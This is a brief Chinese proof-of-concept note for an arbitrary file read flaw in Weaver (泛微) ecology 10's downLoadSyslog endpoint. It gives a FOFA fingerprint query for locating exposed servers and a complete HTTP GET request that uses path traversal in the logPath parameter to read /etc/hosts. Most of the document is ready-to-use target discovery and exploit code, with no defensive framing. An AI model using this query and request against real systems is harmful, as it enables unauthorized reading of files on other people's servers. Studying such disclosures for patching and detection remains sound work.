# 泛微-ecology-10 downLoadSyslog 存在任意文件读取


## fofa

```javascript
body="/build/passport/static/js/lib.js" || body="/build/ecodesdk/static/js/lib.js"||icon_hash="-1619753057"
```

## poc

```javascript
GET /papi/em/transform/downLoadSyslog?logPath=../../.././.././././../../etc/hosts HTTP/1.1
Host:
Accept: */*
Accept-Encoding: gzip, deflate
Connection: keep-alive
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_14_3) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/12.0.3 Safari/605.1.15
```
